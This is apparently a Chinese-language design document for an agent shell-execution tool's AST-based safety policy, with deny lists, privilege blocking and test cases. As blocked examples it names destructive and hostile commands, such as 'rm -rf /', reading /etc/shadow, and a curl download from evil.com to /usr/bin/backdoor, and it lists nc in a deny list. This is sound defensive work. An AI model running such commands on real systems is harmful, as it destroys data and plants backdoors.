# ExecTool 安全策略文档

## 概述

`ExecTool` 的安全策略基于 `ShellCommandParser` 的 AST（抽象语法树）深度分析，而非简单的符号匹配。这种策略能够精确识别真正危险的操作，同时允许安全的命令组合。

## 核心设计原则

1. **深度分析**：解析命令的 AST 结构，理解命令的语义
2. **精确识别**：只阻止真正危险的操作，不过度限制
3. **多层防护**：从命令、参数、操作符等多个维度进行安全检查
4. **可扩展性**：易于添加新的安全规则

## 安全检查层级

### 1. 命令数量限制

**目的**：防止命令注入攻击和资源耗尽

**规则**：单次执行最多 10 个命令

**示例**：
- ✅ 允许：`ls && pwd && date`（3 个命令）
- ❌ 阻止：超过 10 个命令的复杂链

### 2. 操作符检查

**允许的操作符**：
- `and`（`&&`）- 逻辑与
- `or`（`||`）- 逻辑或
- `pipe`（`|`）- 管道
- `sequence`（`;`）- 命令序列

**禁止的操作符**：
- 后台执行（`&`）

**示例**：
- ✅ 允许：`ls && pwd`、`ls | grep test`、`cd /tmp; ls`
- ❌ 阻止：`sleep 10 &`、`ls &`

### 3. 危险命令检测

**危险命令列表**：
- `rm` - 删除文件/目录
- `dd` - 磁盘操作
- `mkfs` - 文件系统格式化
- `fdisk` - 磁盘分区
- `nc` - Netcat 网络工具
- `nmap` - 端口扫描工具
- `format` - 磁盘格式化

**检测方式**：
- 精确匹配：`rm` 匹配 `rm`
- 前缀匹配：`mkfs.ext4` 匹配 `mkfs`
- 路径匹配：`/sbin/mkfs` 匹配 `mkfs`

**示例**：
- ✅ 允许：`ls -la`、`cat file.txt`
- ❌ 阻止：`rm -rf /`、`dd if=/dev/zero of=test.dat`、`mkfs.ext4 /dev/sda1`

### 4. 特权命令检测

**特权命令列表**：
- `sudo` - 以超级用户身份执行
- `su` - 切换用户
- `doas` - 类似 sudo 的特权提升工具

**规则**：完全禁止特权命令

**示例**：
- ✅ 允许：`cat /etc/hosts`
- ❌ 阻止：`sudo rm -rf /`、`su -c "rm file.txt"`、`doas cat /etc/shadow`

### 5. 危险参数组合检测

**针对特定命令的参数检查**：

#### chmod（文件权限）

**禁止**：
- `777` - 所有人可读写执行
- `775` - 组和其他用户可写

**示例**：
- ✅ 允许：`chmod 644 file.txt`、`chmod 755 script.sh`
- ❌ 阻止：`chmod 777 /etc/passwd`、`chmod 775 /etc/shadow`

#### chown（文件所有者）

**禁止**：修改系统目录（`/etc/`、`/usr/`）的文件所有者

**示例**：
- ✅ 允许：`chown user:group /tmp/file.txt`
- ❌ 阻止：`chown root /etc/hosts`

#### mv/cp（移动/复制文件）

**禁止**：覆盖系统文件

**示例**：
- ✅ 允许：`cp file.txt /tmp/`、`mv file.txt backup/`
- ❌ 阻止：`cp file.txt /etc/passwd`、`mv file.txt /etc/hosts`

#### curl/wget（下载文件）

**禁止**：下载到系统目录（`/usr/`、`/etc/`）

**示例**：
- ✅ 允许：`curl -O https://example.com/file.txt`
- ❌ 阻止：`curl -O https://evil.com/malware -o /usr/bin/backdoor`

## 安全检查流程

```
用户命令
    ↓
解析为 AST
    ↓
1. 检查命令数量限制
    ↓
2. 检查操作符类型
    ↓
3. 检查危险命令
    ↓
4. 检查特权命令
    ↓
5. 检查危险参数组合
    ↓
执行命令
```

## 测试用例

### 运行测试

```bash
./wind tool:exec:safety
```

### 测试覆盖

**应该允许的命令**（20 个测试）：
- 简单命令：`ls -la`、`pwd`、`date`
- 管道操作：`ps aux | grep nginx`、`cat file.txt | grep pattern`
- 逻辑操作：`sleep 2 && date`、`ls || echo "failed"`
- 命令序列：`cd /tmp; ls`
- 子 shell：`(echo "nested")`
- 安全权限：`chmod 644 file.txt`、`chmod 755 script.sh`

**应该禁止的命令**（16 个测试）：
- 危险命令：`rm -rf /`、`dd if=/dev/zero of=test.dat`
- 特权命令：`sudo rm -rf /`、`su -c "rm file.txt"`
- 后台执行：`ls &`、`sleep 10 &`
- 危险权限：`chmod 777 /etc/passwd`
- 系统文件操作：`chown root /etc/hosts`

## 与旧策略对比

### 旧策略（符号匹配）

```php
// 简单的正则匹配
if (preg_match('/\brm\b/', $command)) {
    throw new \RuntimeException('命令包含不安全的字符');
}

if (preg_match('/[;|`$()]/', $command)) {
    throw new \RuntimeException('命令包含不安全的字符');
}
```

**问题**：
- ❌ 阻止所有管道操作（`|`），即使安全的 `ls | grep test` 也不行
- ❌ 阻止所有分号（`;`），即使安全的 `cd /tmp; ls` 也不行
- ❌ 阻止所有子 shell（`()`），即使安全的 `(echo test)` 也不行
- ❌ 无法区分危险参数（如 `chmod 644` vs `chmod 777`）

### 新策略（AST 深度分析）

```php
$ast = ShellCommandParser::parse($command);

// 检查危险命令（精确匹配）
$this->checkDangerousCommands($ast['ast']);

// 检查操作符（只禁止后台执行）
$this->checkOperators($ast['ast']);

// 检查危险参数组合
$this->checkDangerousArgs($ast['ast']);
```

**优势**：
- ✅ 允许安全的管道、逻辑操作、命令序列
- ✅ 精确识别危险命令（包括前缀和路径匹配）
- ✅ 检测危险参数组合（如 `chmod 777`）
- ✅ 完全禁止特权命令
- ✅ 基于语义而非符号的安全判断

## 扩展安全规则

### 添加新的危险命令

在 `ExecTool.php` 中修改 `DANGEROUS_COMMANDS` 常量：

```php
private const DANGEROUS_COMMANDS = [
    'rm', 'dd', 'mkfs', 'fdisk', 'nc', 'nmap',
    'your_dangerous_command'  // 添加新命令
];
```

### 添加新的参数检查

在 `checkDangerousArgs()` 方法中添加新的规则：

```php
switch ($commandName) {
    case 'your_command':
        foreach ($args as $arg) {
            if (/* 危险条件 */) {
                throw new \RuntimeException('不允许的危险操作');
            }
        }
        break;
}
```

### 自定义允许的操作符

修改 `ALLOWED_OPERATORS` 常量：

```php
private const ALLOWED_OPERATORS = [
    'and', 'or', 'pipe', 'sequence',
    // 'custom_operator'  // 添加新操作符
];
```

## 最佳实践

1. **最小权限原则**：只执行必要的命令，避免使用危险命令
2. **参数验证**：即使命令被允许，也要验证参数的安全性
3. **日志记录**：记录所有执行的命令用于审计
4. **定期审查**：定期审查安全规则，确保符合当前安全需求
5. **沙箱执行**：考虑在容器或 chroot 环境中执行命令

## 常见问题

### Q: 为什么允许管道操作？

**A**: 管道是 Unix 系统的核心特性，很多安全操作都依赖管道（如 `ps aux | grep nginx`）。只要管道中的每个命令都是安全的，整个管道就是安全的。

### Q: 为什么允许分号和逻辑操作？

**A**: 这些操作符用于构建复杂的命令流程，是脚本编程的基础。通过 AST 分析，我们可以确保这些操作符只用于安全的目的。

### Q: 如何处理用户输入的命令？

**A**:
1. 永远不要直接执行用户输入的原始命令
2. 使用白名单机制限制可执行的命令
3. 对命令参数进行严格验证
4. 考虑使用参数化的命令执行方式

### Q: 安全策略可以绕过吗？

**A**: 任何安全策略都可能被绕过。建议：
1. 结合多层防护（防火墙、沙箱、权限控制）
2. 定期更新安全规则
3. 监控和审计命令执行日志
4. 考虑使用更安全的替代方案（如 API 调用代替命令执行）

## 相关文档

- [Shell 命令解析器文档](./shell-parser.md)
- [Agent 工具调用架构](../CLAUDE.md#工具调用架构)
